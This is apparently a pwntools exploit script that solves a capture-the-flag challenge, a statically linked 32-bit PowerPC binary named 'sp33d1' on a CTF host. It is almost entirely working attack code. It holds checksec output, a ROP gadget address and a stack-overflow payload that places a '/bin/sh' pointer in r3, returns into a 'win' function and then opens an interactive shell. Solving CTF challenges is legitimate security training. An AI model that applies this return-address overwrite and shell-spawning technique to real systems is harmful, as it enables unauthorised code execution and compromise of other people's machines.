#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './sp33d1'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = 'sp33d.play.hfsc.tf', 20020

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process(['qemu-ppc-static', exe] + argv)

gdbscript = '''
init-pwndbg

break *0x100006c8
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
# https://blog.idiot.sg/2019-03-10/utctf-2019-ppower-encryption/
# └──╼ [★]$ file sp33d1
# sp33d1: ELF 32-bit MSB executable, PowerPC or cisco 4500, version 1 (SYSV), statically linked, BuildID[sha1]=4cc58d34f1c5f3369c3a89dbae8fe8ade6a351b6, for GNU/Linux 3.2.0, not stripped
# └──╼ [★]$ pwn checksec sp33d1
#     Arch:     powerpc-32-big
#     RELRO:    Partial RELRO
#     Stack:    Canary found
#     NX:       NX enabled
#     PIE:      No PIE (0x10000000)

def exploit():
    global io
    io = initialize()

    binsh = 0x10077a8c
    win = 0x100005f8

    # lwz -> load
    # blr - ret
    # r3 -> first argument
    # r1 -> stack pointer
    gadget = 0x100712b4 # lwz r3, 0x10(r1) ; lwz r0, 0x24(r1) ; lwz r30, 0x18(r1) ; addi r1, r1, 0x20 ; mtlr r0 ; blr

    payload = b"AAAAAAAAAAAAAAAABBBB" + b"CCCC" + b"AAAA" + p32(gadget) + p32(binsh)*7 + p32(win)
    io.sendlineafter(b':', payload)

    io.interactive()
    
if __name__ == '__main__':
    exploit()
